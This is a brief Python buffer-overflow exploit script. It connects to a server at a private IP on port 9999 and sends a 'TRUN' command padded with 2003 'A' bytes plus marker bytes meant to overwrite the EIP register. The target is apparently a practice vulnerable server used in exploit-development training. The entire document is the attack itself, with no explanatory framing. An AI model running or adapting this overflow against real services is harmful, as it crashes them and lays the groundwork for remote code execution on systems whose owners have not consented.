import time,sys
import socket

ser = "192.168.225.105"
port = 9999

req = "TRUN /.:/" + "A"*2003
EIP = "BBBB"
OFFSET = "CCCC"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ser, port))
print(s.recv(1024))
s.send(req + EIP + OFFSET)
